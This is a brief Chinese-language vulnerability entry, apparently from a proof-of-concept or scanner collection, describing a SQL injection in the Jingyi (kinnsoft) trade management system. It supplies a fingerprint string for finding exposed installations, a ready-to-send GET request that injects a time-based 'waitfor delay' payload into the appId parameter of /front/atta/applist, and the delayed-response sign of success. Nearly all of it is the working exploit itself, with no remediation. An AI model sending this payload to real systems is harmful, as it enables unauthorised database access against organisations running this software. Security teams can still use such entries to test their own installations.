# 荆艺软件贸易管理系统applist存在SQL注入漏洞

荆艺软件贸易管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="荆艺软件 kinnsoft"`
- **请求**：`GET /front/atta/applist?appId=dbo.sys_attachment;waitfor+delay+'0:0:3'--q HTTP/1.1`
- **响应特征**：200 响应时间>=3s